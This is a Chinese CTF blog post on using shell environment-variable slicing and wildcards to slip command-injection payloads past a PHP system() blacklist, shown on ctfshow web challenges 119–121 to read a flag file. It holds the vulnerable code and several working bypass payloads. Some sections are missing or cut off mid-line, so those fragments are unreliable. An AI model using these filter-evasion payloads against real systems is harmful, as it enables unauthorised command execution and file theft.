@@ -1,0 +1,397 @@
+<!doctype html>
+<html lang="zh"><head>
+<title>从0到1,学习环境变量的利用方法 - Pr1nt&#39;s_blog</title>
+<meta charset="UTF-8">
+<meta name="keywords" content="">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+
+<link rel="shortcut icon" href="/images/head/oni.png" type="image/png" />
+<meta name="description" content="环境变量全解">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从0到1,学习环境变量的利用方法">
+<meta property="og:url" content="http://w0r1d-pr1nt.github.io/2024/07/28/pwd/index.html">
+<meta property="og:site_name" content="Pr1nt&#39;s_blog">
+<meta property="og:description" content="环境变量全解">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-07-28T12:29:12.000Z">
+<meta property="article:modified_time" content="2024-08-13T08:31:49.592Z">
+<meta property="article:author" content="Pr1nt">
+<meta property="article:tag" content="rce">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1723539244155">
+
+<link rel="stylesheet" href="/css/style.css?v=1723539244155">
+
+
+
+
+    
+        <link rel="stylesheet" href="/custom.css?v=1723539244155">
+    
+
+
+
+<script src="/lib/mdui_043tiny/mdui.js" async></script>
+<script src="/lib/fancybox/fancybox.umd.js" async></script>
+<script src="/lib/lax.min.js" async></script>
+
+
+<script async src="/js/app.js?v=1723539244155"></script>
+
+ 
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4D4ZJ9G024"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag("js", new Date());
+
+  gtag("config", "G-4D4ZJ9G024");
+</script>
+
+
+<link rel="stylesheet"  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
+<meta name="generator" content="Hexo 7.2.0"></head><body class="nexmoe mdui-drawer-body-left"><div id="nexmoe-background"><div class="nexmoe-bg" style="background-image: url(/images/background/background.png)"></div><div class="mdui-appbar mdui-shadow-0"><div class="mdui-toolbar"><a class="mdui-btn mdui-btn-icon mdui-ripple" mdui-drawer="{target: &#039;#drawer&#039;, swipe: true}" title="menu"><i class="mdui-icon nexmoefont icon-menu"></i></a><div class="mdui-toolbar-spacer"></div><a class="mdui-btn mdui-btn-icon" href="/" title="Pr1nt"><img src="/images/head/onimai.png" alt="Pr1nt"></a></div></div></div><div id="nexmoe-header"><div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="Pr1nt">
+            <img src="/images/head/onimai.png" alt="Pr1nt" alt="Pr1nt">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>12</div>
+        <div><span>标签</span>8</div>
+        <div><span>分类</span>4</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archives.html" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about.html" title="关于Pr1nt">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于Pr1nt
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/friend.html" title="友情链接">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                友情链接
+            </div>
+        </a>
+        
+    </div>
+    
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+        
+            <form id="search_form">
+                <label><input class="st-default-search-input" id="search_value" name="q" type="search" placeholder="搜索" style="
+                    font-size: 15px !important;
+                    height: 56px !important;
+                    background-image: none;
+                "></label>
+            </form>
+         
+    </div>
+</div>
+
+
+	<script async src="/js/search.js?v=1723539244156"></script>
+
+
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+	<div class="nexmoe-widget nexmoe-social">
+		<a
+			class="mdui-ripple"
+			href="https://qm.qq.com/q/8up8m0lXc4"
+			target="_blank"
+			mdui-tooltip="{content: 'QQ'}"
+			style="
+				color: rgb(249, 174, 8);
+				background-color: rgba(249, 174, 8, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-QQ"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://space.bilibili.com/632631573"
+			target="_blank"
+			mdui-tooltip="{content: '哔哩哔哩'}"
+			style="
+				color: rgb(231, 106, 141);
+				background-color: rgba(231, 106, 141, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-bilibili"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://github.com/W0r1d-Pr1nt/"
+			target="_blank"
+			mdui-tooltip="{content: 'GitHub'}"
+			style="
+				color: rgb(25, 23, 23);
+				background-color: rgba(25, 23, 23, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-github"
+			></i> </a
+		>
+	</div>
+</div>
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章分类</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Try-Hack-Me/">Try Hack Me</a>
+          <span class="category-list-count">3</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/WriteUp/">WriteUp</a>
+          <span class="category-list-count">2</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/从0到1/">从0到1</a>
+          <span class="category-list-count">3</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/学习/">学习</a>
+          <span class="category-list-count">2</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/THM/" style="font-size: 20px;">THM</a> <a href="/tags/WP/" style="font-size: 15px;">WP</a> <a href="/tags/rce/" style="font-size: 20px;">rce</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 15px;">学习</a> <a href="/tags/%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/" style="font-size: 10px;">年度总结</a> <a href="/tags/%E5%BC%80%E5%8F%91/" style="font-size: 10px;">开发</a>
+    </div>
+    
+  </div>
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/">2024</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/">2023</a><span class="archive-list-count">4</span></li></ul>
+    </div>
+  </div>
+
+
+
+    
+        
+   
+    <div class="nexmoe-copyright">
+        &copy; 2024 Pr1nt
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        <br>
+<br>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">
+  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+<br>
+<span id="busuanzi_container_site_uv">
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+
+    </div>
+</div><!-- .nexmoe-drawer --></div><div id="nexmoe-content"><div class="nexmoe-primary"><div class="nexmoe-post">
+  <article>
+    
+        <div class="nexmoe-post-cover absolute" style="padding-top: 56.25%;"> 
+            <img src="/images/post/2.jpg" alt="从0到1,学习环境变量的利用方法" loading="lazy">
+            <h1>从0到1,学习环境变量的利用方法</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2024年07月28日</a>
+        
+            <a class="nexmoefont icon-appstore-fill -link" href="/categories/%E4%BB%8E0%E5%88%B01/">从0到1</a>
+        
+        
+    <a><i class="nexmoefont icon-areachart"></i>约945字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>预计需要4分钟</a>
+
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h1 id="环境变量全解"><a href="#环境变量全解" class="headerlink" title="环境变量全解"></a>环境变量全解</h1><span id="more"></span>
+
+<ol>
+<li><a href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%85%A8%E8%A7%A3">环境变量全解</a><ol>
+<li><a href="#%E8%B5%B7%E5%9B%A0">起因</a></li>
+<li><a href="#%E6%AD%A3%E6%96%87">正文</a><ol>
+<li><a href="#%E7%9F%A5%E8%AF%86%E7%82%B9">知识点</a></li>
+<li><a href="#%E4%BE%8B%E9%A2%981-ctfshow-119">例题1 ctfshow 119</a></li>
+<li><a href="#%E4%BE%8B%E9%A2%982-ctfshow-120">例题2 ctfshow 120</a></li>
+<li><a href="#%E4%BE%8B%E9%A2%983-ctfshow-121">例题3 ctfshow 121</a><ol>
+<li><a href="#binrev">&#x2F;bin&#x2F;rev</a></li>
+<li><a href="#binbase64">&#x2F;bin&#x2F;base64</a></li>
+<li><a href="#bincat">&#x2F;bin&#x2F;cat</a></li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>写这篇文章的原因是很久之前就卡在了ctfshow web入门第120关,也就是利用环境变量来构造,在我的rce全解那篇文章中虽然有所提到,但当时研究的不够深入,写的也不是很明白,所以这里另写一篇专门的环境变量内容</p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs stata">在 Linux <span class="hljs-keyword">Shell</span> 中，环境变量是一种在操作系统环境中存储信息的机制。<br><br>这些变量包含了有关系统环境和当前会话的信息，可以影响程序的行为和操作系统的运行。<br><br>以下是关于 Linux <span class="hljs-keyword">Shell</span> 中环墨变量的详细讲解：<br><br>1. 环境变量的种类：<br><br>全局环境变量：对所有用户和进程都可见。<br><br>局部环境变量：只在当前 <span class="hljs-keyword">Shell</span> 会话中可见。<br><br>2. 常见环境变量：<br><br>PATH：包含可执行程序的路径，系统会在这些路径下查找可执行文件。<br><br>HOME：当前用户的主目录路径。<br><br>USER 或 USERNAME：当前登录的用户名。<br><br><span class="hljs-keyword">SHELL</span>：当前使用的 <span class="hljs-keyword">Shell</span> 解释器。<br><br><span class="hljs-keyword">PWD</span>：当前工作目录路径。<br><br>LANG：指定当前语言环境。<br><br>EDITOR：默认文本编辑器。<br><br>IFS: urldecode(<span class="hljs-string">&quot;%20%09%0A&quot;</span>)<br><br>等等...<br><br></code></pre></td></tr></table></figure>
+
+<p>以上来源于gpt</p>
+<p>当构造出<code>$&#123;PATH:~A&#125;</code>时,意味着取PATH变量的最后一位字母,而PATH一般来讲是&#x2F;bin,所以这里就是n</p>
+<p>而PWD一般是<code>/var/www/html</code>,所以我们可以取PWD的最后一位l构造nl来读取文件,即<code>$&#123;PWD:~A&#125;</code></p>
+<p>当<code>:~</code>后面是数字时,例如0,意味着取最后一位,而如果没有<code>~</code>,则是第一位,序列是从0开始算的,字母也一样,A代表第一个,C代表第三个</p>
+<p>这里还有一个要补充,即$&#96;</p>
+<p>1：<code>$=$&#125;???$&#123;PWD::$&#125;??t ????.???</code></p>
+<p>这里为了更短一些可以将<code>$</code></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">PWD</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">SHLVL</span>&#125;<span class="hljs-symbol">:</span><span class="hljs-variable">$&#123;</span><span class="hljs-comment">##&#125;&#125; ===&gt; t  </span><br></code></pre></td></tr></table></figure>
+
+<p>所以最终payload:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$&#123;PWD::<span class="hljs-variable">$&#123;##&#125;</span>&#125;</span>???<span class="hljs-variable">$&#123;PWD::<span class="hljs-variable">$&#123;##&#125;</span>&#125;</span>??<span class="hljs-variable">$&#123;PWD:~<span class="hljs-variable">$&#123;SHLVL&#125;</span>:<span class="hljs-variable">$&#123;##&#125;</span>&#125;</span> ????.???<br></code></pre></td></tr></table></figure>
+
+<h3 id="例题3-ctfshow-121"><a href="#例题3-ctfshow-121" class="headerlink" title="例题3 ctfshow 121"></a>例题3 ctfshow 121</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="hljs-variable">$code</span>))&#123; <br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)&gt;<span class="hljs-number">65</span>)&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="hljs-string">&#x27;you are so long , I dont like &#x27;</span>.<span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>    	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$code</span>).<span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span>&#123;<br>   <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>首先是SHLVL和~被ban了,无法使用,这里可以使用rev,base64,或者一种很神奇的构造t的方法</p>
+<h4 id="bin-rev"><a href="#bin-rev" class="headerlink" title="&#x2F;bin&#x2F;rev"></a>&#x2F;bin&#x2F;rev</h4><p>PWD&#x3D;&#x2F;var&#x2F;www&#x2F;html</p>
+<p>取序号第三位可得r  </p>
+<figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smalltalk"><span class="hljs-string">$&#123;</span><span class="hljs-type">PWD</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#IFS</span>&#125;:<span class="hljs-string">$&#123;</span>##&#125;&#125; ===&gt; <span class="hljs-string">$&#123;</span><span class="hljs-type">PWD</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>&#125; ===&gt; r<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">$</span><span class="hljs-template-variable">&#123;IFS&#125;</span><span class="language-xml"> 变量是用于定义字段分隔符的特殊变量，通常包含空格、制表符和换行符。</span><br><span class="language-xml"></span><br><span class="language-xml">因此，$</span><span class="hljs-template-tag">&#123;#<span class="hljs-name">IFS</span>&#125;</span><span class="language-xml"> 的结果会是 $</span><span class="hljs-template-variable">&#123;IFS&#125;</span><span class="language-xml"> 变量中字符的长度。通常情况下，$</span><span class="hljs-template-variable">&#123;IFS&#125;</span><span class="language-xml"> 的长度是 3，因为它包含了默认的空格、制表符和换行符这三个字符。</span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure>
+
+<p>上面代码块里来自gpt</p>
+<p>这个方法的问题在于读取出来的flag的逆序,需要自己再逆回来,有点麻烦</p>
+<h4 id="bin-base64"><a href="#bin-base64" class="headerlink" title="&#x2F;bin&#x2F;base64"></a>&#x2F;bin&#x2F;base64</h4><p>构造4,使用<code>$&#123;RANDOM&#125;</code>会随机生成一个数,指望他直接生成一个4概率实在是太低了,不如选择长度为4,即 <code>$&#125;???$&#123;PWD::$&#125;?????$$&#125;???$&#123;PWD::$&#125;??$&#123;PWD:$$&#125; ????.???</code></p>
+
+    
+  </article>
+
+  
+      
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/rce/" rel="tag">rce</a> <a class="nexmoefont icon-tag-fill -none-link" href="/tags/web/" rel="tag">web</a>
+    
+</div>
+  
+  
+    <script async src="/js/copy-codeblock.js?v=1723539244002"></script>
+  
+
+  
+      <div class="nexmoe-post-footer">
+          <script src="https://giscus.app/client.js"
+     data-repo="W0r1d-Pr1nt/W0r1d-Pr1nt.github.io"
+     data-repo-id="R_kgDOKUqNjA"
+     data-category="Announcements"
+     data-category-id="DIC_kwDOKUqNjM4CfSnu"
+     data-mapping="pathname"
+     data-strict="0"
+     data-reactions-enabled="1"
+     data-emit-metadata="0"
+     data-input-position="bottom"
+     data-theme="light_high_contrast"
+     data-lang="zh-CN"
+     crossorigin="anonymous"
+     async>
+ </script>
+
+      </div>
+  
+</div></div><div class="nexmoe-post-right">    <div class="nexmoe-fixed">
+        <div class="nexmoe-tool">
+
+            
+
+            
+            
+            <button class="mdui-fab catalog" style="overflow:unset;">
+                <i class="nexmoefont icon-i-catalog"></i>
+                <div class="nexmoe-toc">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%85%A8%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">环境变量全解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%B7%E5%9B%A0"><span class="toc-number">1.1.</span> <span class="toc-text">起因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E6%96%87"><span class="toc-number">1.2.</span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.2.1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%983-ctfshow-121"><span class="toc-number">1.2.2.</span> <span class="toc-text">例题3 ctfshow 121</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#bin-rev"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">&#x2F;bin&#x2F;rev</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bin-base64"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">&#x2F;bin&#x2F;base64</span></a></li></ol></li></ol></li></ol></li></ol>
+                </div>
+            </button>
+            
+
+            
+
+            <a href="#nexmoe-content" class="backtop toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+        </div>
+    </div>
+</div></div><div id="nexmoe-footer"><!--!--></div><div id="nexmoe-search-space"><div class="search-container"><div class="search-header"><div class="search-input-container"><input class="search-input" type="text" placeholder="搜索" onInput="sinput();"></div><a class="search-close" onclick="sclose();">×</a></div><div class="search-body"></div></div></div><div><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
+</div></body></html>
